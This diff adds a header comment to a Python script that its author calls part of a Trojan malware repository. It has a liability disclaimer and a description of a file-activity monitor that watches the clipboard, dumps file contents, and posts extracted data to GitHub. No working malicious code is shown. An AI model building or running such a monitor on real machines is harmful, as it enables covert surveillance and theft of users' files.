@@ -1,3 +1,34 @@
+#! /usr/bin/python
+#################################################################################################
+# Author: Nicholas Fisher
+# Date: March 6th 2024
+# Important Note:
+#  I, Nicholas Fisher, the creator of this Trojan malware, am not responsible for the misuse of 
+# these scripts. They are malicious and should only be used in professionally approved White Hat 
+# scenarios. You are responsible for any consequences resulting from the misuse of this malware,
+# including all fines, fees, and repercussions. Please read this statement carefully: by downloading 
+# any of the scripts in this repository, you, as the user, take full responsibility for storing, using,
+# and testing these malicious scripts and guidelines. You also take full responsibility for any misuse 
+# of this malware. Please note that any data the Trojan extracts will be posted to a GitHub repository, 
+# and if that repository is public, all the extracted data will be available for the whole world to see.
+# Description of Script
+# This script is a cross-platform file activity monitor written in Python. It leverages system-specific
+# APIs such as the Windows API for Windows systems and the psutil library for Linux systems to track 
+# various file operations such as creation, deletion, modification, renaming, copying, and pasting. 
+# Additionally, on Windows, it monitors the clipboard for file paste actions. By running the script,
+# users can observe real-time file system changes in the specified directories on both Windows and 
+# Linux environments. For instance, users can execute the script with the directories they want 
+# to monitor as command-line arguments. Upon execution, the script continuously monitors the 
+# specified directories and outputs relevant information about file activities to the console.
+# Example output:
+# [+] Created C:\WINDOWS\Temp\example.txt
+# [*] Modified C:\WINDOWS\Temp\example.txt
+# [vvv] Dumping contents ...
+# This is an example file.
+# [^^^] Dump Complete.
+# [+] Copied C:\WINDOWS\Temp\example.txt
+# [+] Pasted C:\Users\User\Desktop\example.txt
+#################################################################################################
 import os
 import tempfile
 import threading
